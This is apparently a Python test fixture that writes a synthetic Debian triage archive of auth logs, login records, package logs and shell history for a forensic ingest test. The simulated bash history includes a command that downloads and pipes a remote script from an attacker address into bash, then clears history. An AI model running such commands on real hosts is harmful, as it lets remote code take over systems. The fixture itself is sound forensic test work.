"""A small synthetic Linux triage collection for the ingest integration test.

Names, addresses (documentation ranges) and commands are made up. Every file is one a real
collection has, in the format a Debian host writes it, so the whole Linux path runs: archive
extraction with 7z, auth log classification, a gzip-rotated log read once, binary wtmp/btmp,
year and timezone resolution, shell history and package logs.
"""

from __future__ import annotations

import calendar
import gzip
import io
import struct
import tarfile
from pathlib import Path

# struct utmp on x86_64 Linux, as app.ingest.linux.auth reads it.
UTMP = struct.Struct("hi32s4s32s256shhiii4i20s")


def utmp(kind: int, pid: int, line: str, user: str, host: str, ts: int, addr: tuple[int, int, int, int] = (0, 0, 0, 0)) -> bytes:
    return UTMP.pack(kind, pid, line.encode(), b"", user.encode(), host.encode(), 0, 0, 0, ts, 0, *addr, b"")


AUTH = """Mar  3 10:00:01 web01 sshd[1001]: Accepted publickey for alice from 198.51.100.7 port 50111 ssh2: ED25519 SHA256:abc
Mar  3 10:00:01 web01 sshd[1001]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
Mar  3 10:02:10 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/id
Mar  3 10:02:10 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)
Mar  3 10:05:44 web01 sshd[1200]: Failed password for root from 203.0.113.9 port 40022 ssh2
Mar  3 10:05:46 web01 sshd[1200]: Failed password for root from 203.0.113.9 port 40022 ssh2
Mar  3 10:05:49 web01 sshd[1200]: error: maximum authentication attempts exceeded for root from 203.0.113.9 port 40022 ssh2 [preauth]
Mar  3 10:06:00 web01 sshd[1300]: Invalid user admin from 203.0.113.9 port 40100
Mar  3 10:07:00 web01 login[900]: ROOT LOGIN ON tty1
"""
ROTATED = """Mar  1 08:00:00 web01 sshd[500]: Accepted password for bob from 192.0.2.44 port 51000 ssh2
Mar  1 08:30:00 web01 sudo:      bob : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash
Mar  1 09:00:00 web01 sshd[500]: pam_unix(sshd:session): session closed for user bob
"""
HISTORY = "id\nsudo -l\ncurl -s http://203.0.113.9/x.sh | bash\nhistory -c\n"
DPKG = (
    "2024-03-02 11:00:00 install netcat-openbsd:amd64 <none> 1.219-1\n"
    "2024-03-02 11:00:05 status installed netcat-openbsd:amd64 1.219-1\n"
)


def build(path: Path) -> dict:
    """Write the collection to ``path``; return how many events each artifact type should give."""
    base = calendar.timegm((2024, 3, 3, 9, 0, 0))
    wtmp = (
        utmp(2, 0, "~", "reboot", "6.1.0-18-amd64", base)  # boot
        + utmp(7, 1001, "pts/0", "alice", "198.51.100.7", base + 3600)  # login
        + utmp(8, 1001, "pts/0", "", "", base + 7200)  # logout
    )
    btmp = utmp(6, 1200, "ssh:notty", "root", "203.0.113.9", base + 3900)  # failed login
    files = {
        "etc/hostname": b"web01\n",
        "etc/timezone": b"Etc/UTC\n",
        "etc/os-release": b'NAME="Debian GNU/Linux"\nVERSION_ID="12"\nID=debian\n',
        "var/log/auth.log": AUTH.encode(),
        "var/log/auth.log.2.gz": gzip.compress(ROTATED.encode()),
        "var/log/wtmp": wtmp,
        "var/log/btmp": btmp,
        "var/log/dpkg.log": DPKG.encode(),
        "home/alice/.bash_history": HISTORY.encode(),
    }
    with tarfile.open(path, "w:gz") as archive:
        for name, data in files.items():
            info = tarfile.TarInfo(f"web01-triage/{name}")
            info.size = len(data)
            info.mtime = base + 86400
            archive.addfile(info, io.BytesIO(data))
    return {
        "linux_auth": AUTH.count("\n") + ROTATED.count("\n") + len(wtmp) // UTMP.size + len(btmp) // UTMP.size,
        "linux_shell_history": HISTORY.count("\n"),
        "linux_packages": DPKG.count("\n"),
    }
